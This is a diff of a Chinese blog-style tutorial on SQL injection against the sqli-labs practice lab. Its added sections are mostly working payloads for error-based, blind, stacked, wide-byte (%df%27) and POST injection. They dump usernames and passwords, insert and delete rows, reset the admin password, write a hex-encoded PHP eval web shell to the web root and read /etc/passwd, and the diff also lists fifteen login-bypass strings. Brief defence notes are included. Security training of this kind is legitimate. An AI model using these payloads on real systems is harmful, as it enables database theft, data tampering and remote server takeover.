 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入示例（完整-URL）"><a href="#报错注入示例（完整-URL）" class="headerlink" title="报错注入示例（完整 URL）"></a>报错注入示例（完整 URL）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查版本</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(version())),0x7e),1)--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查当前数据库</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(database())),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 查当前用户</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(user())),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="limit-substr-限制输出"><a href="#limit-substr-限制输出" class="headerlink" title="limit &#x2F; substr 限制输出"></a>limit &#x2F; substr 限制输出</h3><p>可使用 <code>limit</code> 一条一条查询，也可使用 <code>group_concat</code> + <code>substr</code> 进行截取（<code>1,32</code> 控制起始与结束位置）：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,(<span class="keyword">select</span> concat(username,<span class="number">0x7e</span>,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,(<span class="keyword">select</span> substr((group_concat(username,<span class="number">0x7e</span>,password)),<span class="number">1</span>,<span class="number">32</span>) <span class="keyword">from</span> users),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><table>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>当页面存在注入但<strong>没有显示位</strong>、<strong>没有数据库报错信息</strong>时，只能通过页面返回正常&#x2F;异常进行判断，此时需要布尔盲注。</p>
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><table>
 <thead>
 <tr>
 <th>函数</th>
@@ -258,7 +492,7 @@ if (true) {
 </tr>
 <tr>
 <td><code>length(str)</code></td>
-<td>返回字符串的长度</td>
+<td>返回字符串的长度（汉字算 3 字符，数字&#x2F;字母算 1）</td>
 </tr>
 <tr>
 <td><code>mid(str, index, j)</code></td>
@@ -268,7 +502,24 @@ if (true) {
 <td><code>substr(str, index, j)</code></td>
 <td>和 <code>mid</code> 功能一致（index 从 <strong>1</strong> 开始）</td>
 </tr>
+<tr>
+<td><code>left(str, n)</code></td>
+<td>返回 str 左边 n 个字符</td>
+</tr>
+<tr>
+<td><code>left(str, n)</code></td>
+<td>返回 str 左边 n 个字符</td>
+</tr>
+<tr>
+<td><code>exists(query)</code></td>
+<td>判断查询是否有结果，返回 True&#x2F;False</td>
+</tr>
 </tbody></table>
+<blockquote>
+<p><strong>ASCII 码参考：</strong> 数字 <code>0-9</code> &#x3D; 48-57，大写 <code>A-Z</code> &#x3D; 65-90，小写 <code>a-z</code> &#x3D; 97-122。使用 ASCII 比较可二分法加速爆破（先判断 <code>&gt;100</code> 再精确）。</p>
+</blockquote>
+<h3 id="本地测试示例"><a href="#本地测试示例" class="headerlink" title="本地测试示例"></a>本地测试示例</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="keyword">user</span>());                          <span class="comment">-- 判断是否存在</span></span><br><span class="line"><span class="keyword">select</span> substr((<span class="keyword">select</span> <span class="keyword">user</span>()), <span class="number">1</span>, <span class="number">1</span>);                  <span class="comment">-- 截取第一位</span></span><br><span class="line"><span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span>()), <span class="number">3</span>, <span class="number">1</span>));           <span class="comment">-- 获取第三位 ASCII</span></span><br><span class="line"><span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span>()), <span class="number">3</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">100</span>;     <span class="comment">-- 比较判断</span></span><br><span class="line"><span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span>()), <span class="number">3</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">120</span>;     <span class="comment">-- 缩小范围</span></span><br></pre></td></tr></table></figure>
+
 <h3 id="求数据库长度"><a href="#求数据库长度" class="headerlink" title="求数据库长度"></a>求数据库长度</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(select database())=8 --+</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="逐字母爆破"><a href="#逐字母爆破" class="headerlink" title="逐字母爆破"></a>逐字母爆破</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select database()),1,1))=115 --+</span></span><br></pre></td></tr></table></figure>
@@ -295,7 +546,10 @@ if (true) {
 <h4 id="截取第一个字段第一位"><a href="#截取第一个字段第一位" class="headerlink" title="截取第一个字段第一位"></a>截取第一个字段第一位</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>emails<span class="string">&#x27; limit 0,1),1,1)=&#x27;</span>i<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>当页面没有明显的正确&#x2F;错误回显差异时，利用 <code>if(条件, sleep(n), 1)</code> 构造时间延迟，根据响应时间判断条件是否成立。</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>当页面<strong>没有异常、无回显、无报错信息</strong>时，只能利用条件语句结合执行时间的长短判断 payload 是否正确。</p>
+<h3 id="核心：if-sleep"><a href="#核心：if-sleep" class="headerlink" title="核心：if() + sleep()"></a>核心：if() + sleep()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(条件, 条件为真时的返回值, 条件为假时的返回值)</span><br><span class="line">sleep(n)  <span class="comment">-- 延迟 n 秒</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>判断逻辑：</strong> 条件为真时执行 <code>sleep(5)</code> 产生延迟；为假时直接返回。根据响应时间判断条件是否成立。</p>
 <h3 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h3><table>
 <thead>
 <tr>
@@ -350,7 +604,614 @@ if (true) {
 <p><strong>与布尔盲注的关系</strong>：时间盲注本质上是布尔盲注的延伸——只需将布尔条件包裹在 <code>if(条件, sleep(5), 1)</code> 中即可。后续猜解列名、获取数据的步骤完全一致，不再赘述。</p>
 </blockquote>
 <hr>
-<h2 id="sqlmap-使用"><a href="#sqlmap-使用" class="headerlink" title="sqlmap 使用"></a>sqlmap 使用</h2><h3 id="基本检测"><a href="#基本检测" class="headerlink" title="基本检测"></a>基本检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测是否存在注入</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.137.133/sql/Less-1/?id=1&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>PHP 中 <code>mysqli_multi_query()</code> 支持一次执行多条 SQL 语句（用 <code>;</code> 分隔）。如果后端未过滤 <code>;</code>，攻击者可在正常语句后追加任意 SQL。</p>
+<p><strong>与 UNION 的区别：</strong> 堆叠可执行 INSERT &#x2F; UPDATE &#x2F; DELETE &#x2F; DROP 等任意语句，UNION 只能追加 SELECT。</p>
+<h3 id="判断闭合"><a href="#判断闭合" class="headerlink" title="判断闭合"></a>判断闭合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>报错 → 闭合方式为 <code>&#39;</code>（以 Less-38 为例）。</p>
+<h3 id="查库查表"><a href="#查库查表" class="headerlink" title="查库查表"></a>查库查表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查所有数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;show databases;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查 security 库的表</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;<span class="keyword">show</span> tables <span class="keyword">from</span> security;<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 查 users 表的列</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;show columns from security.users;--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Less<span class="number">-38</span>：向 users 表插入一条新记录</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; insert into users(id,username,password) values(38,&#x27;</span>duidie<span class="string">&#x27;,&#x27;</span><span class="number">123456</span><span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure>
+
+<p>之后可用 <code>duidie / 123456</code> 登录，验证插入成功。</p>
+<h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Less<span class="number">-39</span>：数字型（无闭合符号），直接堆叠</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;duidie&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改管理员密码</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">123456</span><span class="string">&#x27; where username=&#x27;</span>admin<span class="string">&#x27;;--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="读写文件（需-secure-file-priv-允许）"><a href="#读写文件（需-secure-file-priv-允许）" class="headerlink" title="读写文件（需 secure_file_priv 允许）"></a>读写文件（需 secure_file_priv 允许）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 写一句话木马</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;select 0x3c3f706870206576616c28245f524551554553545b27636d64275d293b3f3e into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 读系统文件</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;<span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>);<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意：</strong> <code>secure_file_priv</code> 为 NULL 时禁止读写；为空时可任意路径。执行 <code>show variables like &#39;%secure_file_priv%&#39;</code> 查看。</p>
+</blockquote>
+<h3 id="各-Less-闭合方式"><a href="#各-Less-闭合方式" class="headerlink" title="各 Less 闭合方式"></a>各 Less 闭合方式</h3><table>
+<thead>
+<tr>
+<th>Less</th>
+<th>闭合方式</th>
+<th>请求方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Less-38</td>
+<td><code>&#39;</code></td>
+<td>GET</td>
+<td>单引号闭合</td>
+</tr>
+<tr>
+<td>Less-39</td>
+<td>无（数字型）</td>
+<td>GET</td>
+<td>无需引号</td>
+</tr>
+<tr>
+<td>Less-40</td>
+<td><code>&#39;)</code></td>
+<td>GET</td>
+<td>括号+单引号</td>
+</tr>
+<tr>
+<td>Less-41</td>
+<td>无（数字型）</td>
+<td>GET</td>
+<td>无闭合</td>
+</tr>
+<tr>
+<td>Less-42</td>
+<td><code>&#39;</code></td>
+<td>POST</td>
+<td>POST 型堆叠</td>
+</tr>
+<tr>
+<td>Less-43</td>
+<td><code>&#39;)</code></td>
+<td>POST</td>
+<td>POST 型堆叠</td>
+</tr>
+<tr>
+<td>Less-44</td>
+<td><code>&#39;</code></td>
+<td>POST（无回显）</td>
+<td>需配合时间盲注验证</td>
+</tr>
+<tr>
+<td>Less-45</td>
+<td><code>&#39;)</code></td>
+<td>POST（无回显）</td>
+<td>需配合时间盲注验证</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>防御：</strong> 使用 <code>mysqli_query()</code> 而非 <code>mysqli_multi_query()</code>；使用 PDO 预处理语句。</p>
+</blockquote>
+<hr>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>当某字符大小为 1 字节时称窄字节（英文、数字），2 字节时称宽字节（中文等）。常见宽字节编码：<strong>GB2312、GBK、GB18030、BIG5、Shift_JIS</strong>。</p>
+<p>GBK 编码规则：<strong>第一个字节 ascii &gt; 128（即 hex &gt; 0x80）时，与下一字符合并为一个汉字</strong>。</p>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>PHP 使用 <code>addslashes()</code> 或 <code>magic_quotes_gpc</code> 开启时，<code>’</code> 被转义为 <code>\’</code>（URL 编码：<code>%5c%27</code>）。</p>
+<p>利用 GBK 编码，在 <code>%5c</code> 前拼接一个 <strong>&gt; 0x7F 的字节</strong> 吃掉反斜杠：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入 payload:    %df%27</span><br><span class="line">addslashes 后:   %df%5c%27     (对 ‘ 加了转义 → \’)</span><br><span class="line">MySQL GBK 解析:  %df%5c → 一个汉字, %27 单独作为 ‘ 逃逸</span><br><span class="line">最终效果:        [汉字]’       ← 单引号成功逃逸！</span><br></pre></td></tr></table></figure>
+
+<p><strong>核心：<code>%df</code> 吃掉 <code>%5c</code></strong>，让转义符 <code>\</code> 失效。</p>
+<h3 id="判断闭合-1"><a href="#判断闭合-1" class="headerlink" title="判断闭合"></a>判断闭合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure>
+
+<p>报错 → 闭合方式为 <code>’</code>，宽字节注入有效。</p>
+<h3 id="验证注入"><a href="#验证注入" class="headerlink" title="验证注入"></a>验证注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>正常回显，说明 and 条件生效。</p>
+<h3 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df’ <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br><span class="line"># 报错 → 共 <span class="number">3</span> 列</span><br></pre></td></tr></table></figure>
+
+<h3 id="确定回显位"><a href="#确定回显位" class="headerlink" title="确定回显位"></a>确定回显位</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"># 回显 <span class="number">2</span> 和 <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(username,<span class="number">0x3a</span>,password) <span class="keyword">from</span> users)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="通用绕过字符"><a href="#通用绕过字符" class="headerlink" title="通用绕过字符"></a>通用绕过字符</h3><p>不止 <code>%df</code>，只要首字节 &gt; 0x7F 即可：</p>
+<table>
+<thead>
+<tr>
+<th>payload</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%df%27</code></td>
+<td>最常用</td>
+</tr>
+<tr>
+<td><code>%aa%27</code></td>
+<td>同样可行</td>
+</tr>
+<tr>
+<td><code>%de%27</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>%81%27</code></td>
+<td>宽字节范围下限附近</td>
+</tr>
+<tr>
+<td><code>%fe%27</code></td>
+<td>宽字节范围上限附近</td>
+</tr>
+</tbody></table>
+<h3 id="各-Less-对应"><a href="#各-Less-对应" class="headerlink" title="各 Less 对应"></a>各 Less 对应</h3><table>
+<thead>
+<tr>
+<th>Less</th>
+<th>注入方式</th>
+<th>请求方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Less-32</td>
+<td><code>%df%27</code> Bypass</td>
+<td>GET</td>
+<td><code>addslashes()</code> 过滤</td>
+</tr>
+<tr>
+<td>Less-33</td>
+<td><code>%df%27</code> Bypass</td>
+<td>GET</td>
+<td><code>addslashes()</code></td>
+</tr>
+<tr>
+<td>Less-34</td>
+<td><code>%df%27</code> Bypass</td>
+<td>POST</td>
+<td>POST 型宽字节</td>
+</tr>
+<tr>
+<td>Less-36</td>
+<td><code>%df%27</code> Bypass</td>
+<td>GET</td>
+<td><code>mysql_real_escape_string()</code></td>
+</tr>
+<tr>
+<td>Less-37</td>
+<td><code>%df%27</code> Bypass</td>
+<td>POST</td>
+<td>POST 型 <code>mysql_real_escape_string()</code></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>注意：</strong> <code>mysql_real_escape_string()</code> 同样能被宽字节绕过。<strong>防御：</strong> 使用 PDO 预处理；设置连接字符集 <code>mysql_set_charset(‘gbk’, $conn)</code> 而非 <code>SET NAMES ‘gbk’</code>；统一使用 UTF-8 编码。</p>
+</blockquote>
+<hr>
+<h2 id="POST-注入"><a href="#POST-注入" class="headerlink" title="POST 注入"></a>POST 注入</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>从 Less-11 起，注入点从 GET 的 URL 参数变为 <strong>POST 请求体</strong>。注入原理与 GET 型完全相同，区别仅在于数据提交位置。</p>
+<p>后端 SQL 大致为：<code>SELECT * FROM users WHERE username=&#39;$uname&#39; AND password=&#39;$passwd&#39;</code></p>
+<p>可用 Burp Suite 抓包 → Repeater 重放，或用 HackBar 插件的 POST 模式。</p>
+<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>回显第一位用户的场景下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 注释掉密码验证</span><br><span class="line">username: admin<span class="string">&#x27; or 1=1 --+</span></span><br><span class="line"><span class="string">password: (任意)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 永真条件闭合</span></span><br><span class="line"><span class="string">username: admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">password: (任意)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 联合查询覆盖</span></span><br><span class="line"><span class="string">username: &#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>#</span><br><span class="line">password: (任意)</span><br></pre></td></tr></table></figure>
+
+<p><strong>万能密码大全（Less-11 练习）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>&quot;or &quot;a&quot;=&quot;a</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>&#39;)or(&#39;a&#39;=&#39;a</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>or 1=1--</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>&#39;or 1=1--</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>&#39;or&#39; 1=1--</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>&quot;or 1=1--</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>&#39;or&#39;a&#39;=&#39;a</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>&quot;or&quot;=&quot;a&#39;=&#39;a</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td><code>&quot;))or 1=1--+</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td><code>1 or &#39;1&#39;=&#39;1&#39;=1</code></td>
+</tr>
+<tr>
+<td>11</td>
+<td><code>&#39;OR 1=1%00</code></td>
+</tr>
+<tr>
+<td>12</td>
+<td><code>&quot;or 1=1%00</code></td>
+</tr>
+<tr>
+<td>13</td>
+<td><code>)or 1=1--+</code></td>
+</tr>
+<tr>
+<td>14</td>
+<td><code>&quot;) or 1=1--+</code></td>
+</tr>
+<tr>
+<td>15</td>
+<td><code>&#39;)or 1=1--+</code></td>
+</tr>
+</tbody></table>
+<h3 id="Less-11：POST-联合查询（’-闭合）"><a href="#Less-11：POST-联合查询（’-闭合）" class="headerlink" title="Less-11：POST 联合查询（’ 闭合）"></a>Less-11：POST 联合查询（’ 闭合）</h3><h4 id="判断闭合-2"><a href="#判断闭合-2" class="headerlink" title="判断闭合"></a>判断闭合</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: uname<span class="operator">=</span>admin<span class="string">&#x27;&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p>报错 <code>&#39;admin&#39;&#39; limit 0,1&#39;</code> → 闭合方式为 <code>&#39;</code>。</p>
+<h4 id="判断列数-1"><a href="#判断列数-1" class="headerlink" title="判断列数"></a>判断列数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; order by 2#&amp;passwd=test&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 正常 → 共 2 列</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="确定回显位-1"><a href="#确定回显位-1" class="headerlink" title="确定回显位"></a>确定回显位</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>aaa<span class="string">&#x27; union select 1,2#&amp;passwd=test&amp;submit=Submit</span></span><br><span class="line"><span class="string"># 回显 2</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="爆表-1"><a href="#爆表-1" class="headerlink" title="爆表"></a>爆表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>aaa<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>aaa<span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;)#&amp;passwd=test&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="脱库-1"><a href="#脱库-1" class="headerlink" title="脱库"></a>脱库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>aaa<span class="string">&#x27; union select 1,group_concat(username,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,password) from users#&amp;passwd=test&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-12：-闭合"><a href="#Less-12：-闭合" class="headerlink" title="Less-12：) 闭合"></a>Less-12：<code>)</code> 闭合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin&quot;) or 1=1#&amp;passwd=test&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
